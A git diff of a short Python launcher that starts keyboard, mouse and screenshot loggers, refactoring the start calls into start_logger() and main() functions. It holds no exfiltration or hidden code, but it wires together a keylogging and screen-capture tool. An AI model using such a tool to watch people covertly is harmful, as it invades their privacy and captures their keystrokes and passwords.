@@ -1,15 +1,23 @@
 from mouse_logger import MouseLogger
 from keyboard_logger import KeyboardLogger
 from screenshot_taker import ScreenshotTaker
-from constants import TIME_INTERVAL
+# from program_terminator import ProgramTerminator
 
 
 
+mouseLogger = MouseLogger()
+keyLogger =  KeyboardLogger()
+screenshotTaker = ScreenshotTaker()
 
-mouseLogger = MouseLogger(TIME_INTERVAL)
-keyLogger =  KeyboardLogger(TIME_INTERVAL)
-screenshotTaker = ScreenshotTaker(TIME_INTERVAL)
+def start_logger():
+    mouseLogger.start()
+    keyLogger.start()
+    screenshotTaker.start()
 
-mouseLogger.start()
-keyLogger.start()
-screenshotTaker.start()
+def main():
+    start_logger()
+    print("##### Program Stopped! #####")
+
+
+if __name__ == "__main__":
+    main()
